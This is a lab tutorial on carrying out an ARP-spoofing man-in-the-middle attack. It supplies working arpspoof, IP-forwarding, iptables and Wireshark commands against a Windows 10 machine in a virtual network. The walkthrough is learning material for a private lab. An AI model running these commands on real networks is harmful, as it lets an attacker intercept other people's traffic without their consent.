A MITM Attack (Man In The Middle) is an attack where the attacker gets to see all of the packets the victim's machine is sending as he's the router.

To start the attack first boot your pfsense router (gateway), kali machine and the windows 10 victim machine and folow those steps:

1: in your kali machine first enable port forwording by typing this command in the kali terminal:
```bash
sudo su 
echo 1 > /proc/sys/net/ipv4/ip_forward
```
2: open a second terminal (keep this root one for later). In the new one, run:
```bash
sudo arpspoof -i eth0 -t 192.168.56.105 192.168.56.254
```
*this tells the victim machine "Im the gateway"*.

if in the terminal you get something like this:

┌──(kali㉿kali)-[~]
└─$ sudo arpspoof -i eth0 -t 192.168.56.105 192.168.56.254
[sudo] password for kali: 
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:d1:d4:e2 0806 42: arp reply 192.168.56.254 is-at 8:0:27:8a:35:d2

Than leave it running and you can move on to the next step.

3: Open a third terminal. Run the second half — tell the gateway "I'm the victim":
```bash
sudo arpspoof -i eth0 -t 192.168.56.254 192.168.56.105
```
again you shuld get something like this: 

┌──(kali㉿kali)-[~]
└─$ sudo arpspoof -i eth0 -t 192.168.56.254 192.168.56.105
[sudo] password for kali: 
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2
8:0:27:8a:35:d2 8:0:27:2d:91:5a 0806 42: arp reply 192.168.56.105 is-at 8:0:27:8a:35:d2

Both spoofs running. if you did every step right now you're the man in the middle:
every packet between Victim-Win10 and pfSense passes through your Kali box first!

Let's prove it. Go to Victim-Win10, open a browser, visit any normal website (like a news site).
Meanwhile, open a fourth terminal on Kali and run:
```bash
sudo wireshark
```

this opens waireshark the packet analyses tool.

Start capturing on eth0. Filter by:
```bash
ip.addr == 192.168.56.105
```

**IMPORTENT**
before starting to browse type this in the terminal:
```bash
sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
```
When Win10's traffic passes through Kali, it still has Win10's own IP (192.168.56.105) stamped on it as sender. VirtualBox's internet adapter (eth1) doesn't know that IP because it only expects traffic from Kali's own IP. So it silently dropped everything.
MASQUERADE tells Kali: "before sending this out eth1, cross out the original sender's IP and put my own IP instead." Now VirtualBox's NAT accepts it, since it looks like it came from Kali. When the reply comes back, Kali remembers who really asked and forwards it back to Win10.
That's the whole trick, so it's basically the same lie ARP spoofing does, just one layer up (IP instead of MAC).

Now you can browse on Win10, then check Wireshark, you should see the victim's traffic showing up on your Kali box.